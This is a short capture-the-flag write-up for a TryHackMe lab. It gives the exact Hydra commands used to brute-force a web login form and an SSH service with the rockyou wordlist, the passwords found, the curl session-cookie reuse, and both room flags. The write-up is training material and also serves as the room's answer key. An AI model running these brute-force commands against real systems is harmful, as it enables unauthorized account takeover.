# TryHackMe Notes – Hydra Brute Force & Flags

## Target Information
Username: molly  
Target IP: 10.49.134.146  

---

## Web Login Brute Force (Hydra)

```bash hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.134.146 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V```  

Password found: sunshine  

---

## Web Session Access (curl)

```bash curl -c cookies.txt -d "username=molly&password=sunshine" http://10.49.134.146/login```  
→ Sent login request and saved session cookie for authentication  

```bash curl -b cookies.txt http://10.49.134.146/```  
→ Used saved session cookie to access authenticated web content  

Flag 1: THM{2673a7dd116de68e85c48ec0b1f2612e}  

---

## SSH Brute Force (Hydra)

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.134.146 -t 4 ssh  

Password found: butterfly  

---

## SSH Access & Flag 2

ssh molly@10.49.134.146  
Password: butterfly  

ls  
cat flag2.txt  

Flag 2: THM{c8eeb0468febbadea859baeb33b2541b}  
